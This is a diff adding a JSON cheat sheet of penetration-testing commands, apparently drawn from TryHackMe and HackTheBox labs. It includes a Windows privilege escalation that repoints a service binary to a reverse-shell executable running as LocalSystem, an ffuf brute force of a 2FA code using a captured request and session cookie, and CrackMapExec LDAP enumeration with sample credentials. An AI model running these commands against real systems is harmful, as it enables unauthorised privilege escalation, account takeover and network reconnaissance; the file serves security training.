@@ -1,0 +1,54 @@
+[
+  {
+    "description": "AccessChk is an tool from Sysinternals to gain information about the access control of a service. If the service DACL (not the service's executable DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service. From the AccessChk output you must verify whether OWNER has higher permission than ACCESS_ALLOWED_ACE_TYPE, if you have control over ACCESS_ALLOWED_ACE_TYPE you can perform privesc by changing executable of service. This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself. This is shown in the extra code section.\n\nCommand Reference:\n```\nthmservice: Service to see the access control from\n```\n",
+    "command": ".\\accesschk.exe -qlc thmservice\n",
+    "code": "To change the service's associated executable and account, we can use the following command (mind the spaces after the equal signs when using sc.exe, in PowerShell):\nsc config THMService binPath= \"C:\\Users\\thm-unpriv\\rev-svc3.exe\" obj= LocalSystem\n\nC:\\tools\\AccessChk> accesschk64.exe -qlc thmservice\n[0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\\SYSTEM\n      SERVICE_QUERY_STATUS\n      SERVICE_QUERY_CONFIG\n      SERVICE_INTERROGATE\n      SERVICE_ENUMERATE_DEPENDENTS\n      SERVICE_PAUSE_CONTINUE\n      SERVICE_START\n      SERVICE_STOP\n      SERVICE_USER_DEFINED_CONTROL\n      READ_CONTROL\n[4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\\Users\n      SERVICE_ALL_ACCESS\n",
+    "items": [
+      "Red"
+    ],
+    "references": [
+      "https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk"
+    ],
+    "name": "accesschk"
+  },
+  {
+    "description": "Description what the command does and is usefull for.\n\nCommand Reference:\n```\nDomain: arttoolkit.hacker.com\n\nPort: 9001\n\nIP address: 10.10.21.14\n```\n",
+    "command": "put command here\n",
+    "code": "extra code can be placed here. This part is optional and can be removed if not nessasary. \n",
+    "items": [
+      "Blue"
+    ],
+    "references": [
+      "LINK",
+      "LINK"
+    ],
+    "name": "example"
+  },
+  {
+    "description": "ffuf is a fast web fuzzer written in Go that allows typical directory discovery, virtual host discovery (without DNS records)and GET and POST parameter fuzzing. \n\nCommand Reference:\n```\nBurprequest in file: req\n\nProtocol: https\n\nWordlist with placeholder to replace (FUZZ): /usr/share/wordlists/seclists/Fuzzing/6-digits-000000-999999.txt:FUZZ\n\n```\n",
+    "command": "ffuf -request req -request-proto https -w /usr/share/wordlists/seclists/Fuzzing/6-digits-000000-999999.txt:FUZZ > ffuf.out\n",
+    "code": "POST /2fa.html HTTP/2\nHost: teamcity-dev.coder.htb\nCookie: __test=1; RememberMe=394468061^2#-7089909565306817793; TCSESSIONID=55B00B03A2687F2331142FB623BF2CCC\nAccept: application/json\nOrigin: https://teamcity-dev.coder.htb\n\npassword=FUZZ  \n",
+    "items": [
+      "Blue",
+      "Red"
+    ],
+    "references": [
+      "https://github.com/ffuf/ffuf",
+      "https://www.freecodecamp.org/news/web-security-fuzz-web-applications-using-ffuf/"
+    ],
+    "name": "ffuf-request"
+  },
+  {
+    "description": "\"CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks.\" - https://github.com/byt3bl33d3r/CrackMapExec/wiki. This command will enumerate domain groups, local groups, users, user descriptions, users trusted for delegation, users without a password, You can also use CIDR notation to target a range of ip addresses (i.e. 10.10.10.0/24).\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tUsername: john\n\n\tPassword: password123\n\n\tHash (-H):  807726fcf9f188adc26eeafd7dc16bb7\n",
+    "command": "crackmapexec ldap 10.10.10.1 -u 'john' -p 'password123' --trusted-for-delegation  --password-not-required --admin-count --users --groups\n",
+    "items": [
+      "Blue",
+      "Red"
+    ],
+    "references": [
+      "https://github.com/byt3bl33d3r/CrackMapExec",
+      "https://github.com/byt3bl33d3r/CrackMapExec/wiki"
+    ],
+    "name": "Crackmapexec-Enum-LDAP"
+  }
+]
